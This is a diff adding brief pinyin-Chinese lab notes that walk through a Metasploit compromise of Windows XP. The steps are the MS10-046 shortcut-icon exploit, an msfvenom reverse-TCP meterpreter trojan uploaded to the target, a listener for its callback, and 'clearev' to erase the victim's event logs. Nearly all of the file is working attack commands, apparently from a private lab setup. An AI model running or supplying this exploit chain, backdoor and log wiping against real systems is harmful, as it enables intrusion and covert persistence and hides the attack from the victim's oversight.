@@ -1,0 +1,30 @@
+Windows XP Professional with Service Pack 3 (x86) - CD  2008-05-01  zhegebanben ceshi tongguo 
+win7 haimeiceshi 
+
+use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
+set SRVHOST 192.168.55.201   kali  de ip dizhi
+run
+yunxinghoushengcheng http://192.168.55.201/
+
+zai xp xia dakai zhege lianjie  hui tiaozhuandao \\192.168.55.201\NCqMi\
+yihui  kali xiamian jiu hui tishi chengong 
+
+meterpreter > upload /home/kali/openme.exe c:\
+zhetiao mingling keyi shangchuan muma 
+muma de shengchenggongcheng    msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f exe -o openme.exe
+chmod 777 openme.exe keneng shiduoyude 
+
+tuichudangqian meterpreter
+
+keyiyong muma lianjiele
+
+
+kakaijianting
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp     xpshi x86de32weide
+set lhost 192.168.55.201                 kali ipdizhi
+set lport 50000                          
+run
+
+zhihou xp yunxing openme.exe  jiukeyi zidonglianshang 
+meterpreter > clearev    qingchurizhi
